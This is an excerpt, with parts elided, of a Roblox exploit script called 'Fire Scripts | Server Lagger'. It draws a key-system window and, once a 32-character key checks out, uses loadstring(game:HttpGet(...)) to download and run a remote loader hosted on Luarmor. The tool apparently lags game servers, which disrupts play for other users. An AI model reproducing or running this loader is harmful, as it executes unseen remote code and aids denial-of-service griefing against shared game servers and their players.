...
if not ret then
    local KeyWindow = Fluent:CreateWindow{
        Title = "Fire Scripts | Server Lagger - Key System",
...
if validKey and #validKey == 32 then
    ...
    Fluent:Notify({
        Title = "Loading Server Lagger Script",
        Content = "Check console by F9 if script doesn't load. If stuck at 95%, re-execute.",
        Duration = 5
    })
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/e443d35e6dae06d848433d562bc908d4.lua"))()
end
